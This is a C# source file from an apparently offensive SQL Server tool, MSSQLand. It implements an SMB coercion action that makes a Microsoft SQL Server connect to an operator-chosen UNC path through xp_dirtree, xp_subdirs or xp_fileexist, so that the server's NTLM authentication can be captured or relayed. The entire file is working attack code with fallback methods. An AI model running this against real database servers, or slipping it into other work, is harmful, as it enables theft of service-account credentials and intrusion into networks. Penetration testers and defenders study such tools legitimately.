﻿using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Text.RegularExpressions;

namespace MSSQLand.Actions.Network
{
    internal class SmbCoerce : BaseAction
    {
        private string _uncPath;

        /// <summary>
        /// Validates the arguments passed to the SmbCoerce action.
        /// </summary>
        /// <param name="additionalArguments">The UNC path for SMB coercion (e.g., \\\\172.16.118.218\\shared).</param>
        public override void ValidateArguments(string additionalArguments)
        {
            if (string.IsNullOrEmpty(additionalArguments))
            {
                throw new ArgumentException("SMB action requires targeted UNC path (e.g., \\\\172.16.118.218\\shared).");
            }

            string path = additionalArguments.Trim();

            // Auto-prepend \\ if missing
            if (!path.StartsWith("\\\\"))
            {
                path = "\\\\" + path.TrimStart('\\');
            }

            // If only hostname provided (no share), append default share name
            string[] parts = path.Substring(2).Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 1)
            {
                // Only hostname, add default share
                path = path.TrimEnd('\\') + "\\Data";
                Logger.Info($"No share name provided, using default: {path}");
            }

            // Verify UNC path
            if (!ValidateUNCPath(path))
            {
                throw new ArgumentException($"Invalid UNC path format: {path}. Ensure it includes a valid host and share name.");
            }

            _uncPath = path;
        }

        /// <summary>
        /// Executes SMB coercion using multiple fallback methods.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        public override object? Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Sending SMB request to: {_uncPath}");

            // Method 1: Try xp_dirtree (most common)
            if (TryXpDirtree(databaseContext))
            {
                return true;
            }

            // Method 2: Try xp_subdirs (fallback)
            if (TryXpSubdirs(databaseContext))
            {
                return true;
            }

            // Method 3: Try xp_fileexist (last resort)
            if (TryXpFileexist(databaseContext))
            {
                return true;
            }

            Logger.Error("All SMB coercion methods failed.");

            return false;
        }

        /// <summary>
        /// Attempts SMB coercion using xp_dirtree (most reliable method).
        /// </summary>
        private bool TryXpDirtree(DatabaseContext databaseContext)
        {
            try
            {
                Logger.Info("Trying xp_dirtree method...");

                string query = $"EXEC master..xp_dirtree '{_uncPath}';";
                databaseContext.QueryService.ExecuteNonProcessing(query);

                Logger.Success("SMB request sent successfully using xp_dirtree");
                return true;
            }
            catch (Exception ex)
            {
                Logger.Warning($"xp_dirtree method failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Attempts SMB coercion using xp_subdirs (alternative method).
        /// </summary>
        private bool TryXpSubdirs(DatabaseContext databaseContext)
        {
            try
            {
                Logger.Info("Trying xp_subdirs method...");

                string query = $"EXEC master..xp_subdirs '{_uncPath}';";
                databaseContext.QueryService.ExecuteNonProcessing(query);

                Logger.Success("SMB request sent successfully using xp_subdirs");
                return true;
            }
            catch (Exception ex)
            {
                Logger.Warning($"xp_subdirs method failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Attempts SMB coercion using xp_fileexist (last resort method).
        /// </summary>
        private bool TryXpFileexist(DatabaseContext databaseContext)
        {
            try
            {
                Logger.Info("Trying xp_fileexist method...");

                // xp_fileexist requires a file path, append a file
                string filePath = _uncPath.TrimEnd('\\') + "\\data.txt";
                string query = $"EXEC master..xp_fileexist '{filePath}';";
                databaseContext.QueryService.ExecuteNonProcessing(query);

                Logger.Success("SMB request sent successfully using xp_fileexist");
                Logger.Info("Note: xp_fileexist was used with a dummy file path to trigger SMB authentication");
                return true;
            }
            catch (Exception ex)
            {
                Logger.Warning($"xp_fileexist method failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Validates the format of a UNC path.
        /// </summary>
        /// <param name="path">The UNC path to validate.</param>
        /// <returns>True if the path is valid; otherwise, false.</returns>
        private bool ValidateUNCPath(string path)
        {
            // Basic UNC path validation using regular expressions
            const string uncPattern = @"^\\\\[a-zA-Z0-9\-\.]+\\[a-zA-Z0-9\-_\.]+$";
            return Regex.IsMatch(path, uncPattern);
        }
    }
}
